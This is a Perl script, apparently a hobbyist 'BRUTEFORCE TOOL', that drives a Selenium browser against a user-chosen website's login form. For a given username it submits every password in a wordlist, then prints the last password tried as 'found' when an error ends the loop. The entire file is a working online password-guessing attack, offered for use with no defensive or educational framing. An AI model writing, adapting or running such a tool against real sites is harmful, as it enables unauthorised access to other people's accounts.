#usr/bin/env/perl

use warnings;
use strict;
use LWP::Simple;
use Win32::Console;
use Term::ANSIColor;
use Win32::Console::ANSI;
use Try::Tiny;
use Selenium::Remote::Driver;

$SIG{'INT'} = sub
{
   print color("red"),"Programme Terminated!\n",color("reset");
   exit;
};

#Reads and display ascii art from file
print color("red");
print "\n";
open(my $fh, "ascii.txt") or die("Can't open ascii.txt");
while(my $line = <$fh>) {
    print $line;
}
print color("reset");
close $fh;
#----------------------------------------

#Credits
print color("green"),"[+]",color("blue"),"<----V1.0---->\n",color("reset");
print color("green"),"[+]",color("blue"),"----> CODED BY",color("red")," DEXTER",color("blue")," AKA",color("red")," Ahmad Ishaq\n",color("reset");
print color("green"),"[+]",color("blue"),"----> BRUTEFORCE TOOL\n",color("reset");
print "\n";
#----------------------------------------

#Take required Variables as Input from user
print color("green"),"[-]",color("reset"),"Enter the website URL [http://url.com] : ";
my $web=<>;
print color("green"), "[+]",color("reset"),"Checking if url Exists ";
my $url = $web;

#Checks if url exists
if (head($url)) {
  print color("green"),"[OK]\n",color("reset");
} else {
  print color("red"),"[NOT]\n",color("reset");
  exit;
}
#----------------------------------------

my $passw;
my $driver = Selenium::Remote::Driver->new();
print color('bold blue');
$driver->get($web);
print color("green"),"[-]",color("reset"),"Enter the username xpath : ";
my $u_x =<>;
print color("green"),"[-]",color("reset"),"Enter the password xpath : ";
my $p_x =<>;
print color("green"),"[-]",color("reset"),"Enter the login button xpath : ";
my $lbtn_x =<>;
print color("green"),"[-]",color("reset"),"Enter username : ";
my $username =<>;
print color("green"),"[-]",color("reset"),"Enter filename : ";
my $filename =<>;
chomp($filename);
#----------------------------------------

#Reads password file
open( $fh, '<:encoding(UTF-8)', $filename)
  or die "Could not open file '$filename' $!";
#----------------------------------------

#Process the data for Bruteforcing
try
{
 while (my $row = <$fh>)
 {
   chomp $row;
   my $h1 = $driver->find_element($u_x);
   $h1->clear();
   my $h2 = $driver->find_element($p_x);
   my $h3 = $driver->find_element($lbtn_x);
   $h1->send_keys($username);
   $h2->send_keys($row);
   $h3->click();
   print color("red"),"----------------------------------------\n",color("reset");
   print color("blue")," the passsword tried : ",color("green"),"$row\n",color("reset");
   print color("blue")," the username tried : ",color("green"),"$username\n",color("reset");
   print color("red"),"----------------------------------------\n",color("reset");
   $passw=$row;
 }
}
catch
{
  print color("green"),"password found or login attempts exceeded\n",color("reset");
  print color("red"),"----------------------------------------\n",color("reset");
  print color("blue")," passsword : ",color("green"),"$passw\n",color("reset");
  print color("blue")," username :",color("green")," $username\n",color("reset");
  print color("red"),"----------------------------------------\n",color("reset");
};
#------------------------------------------

$driver->quit();
exit;
